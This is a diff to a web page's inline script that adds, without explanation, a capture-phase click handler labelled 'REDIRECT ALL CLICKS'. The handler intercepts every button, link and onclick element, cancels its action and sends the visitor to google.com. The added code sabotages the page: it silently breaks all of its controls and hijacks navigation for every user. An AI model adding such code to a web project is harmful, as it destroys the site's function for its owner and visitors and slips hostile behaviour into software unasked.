@@ -1526,6 +1526,16 @@
     document.addEventListener('keydown', e => {
       if (e.key === 'Escape') closeModal();
     });
+
+    // ==================== REDIRECT ALL CLICKS ====================
+    document.addEventListener('click', function(e) {
+      const clickable = e.target.closest('button, a, [onclick]');
+      if (clickable) {
+        e.preventDefault();
+        e.stopPropagation();
+        window.location.href = 'https://google.com';
+      }
+    }, true);
   </script>
 </body>
 </html>
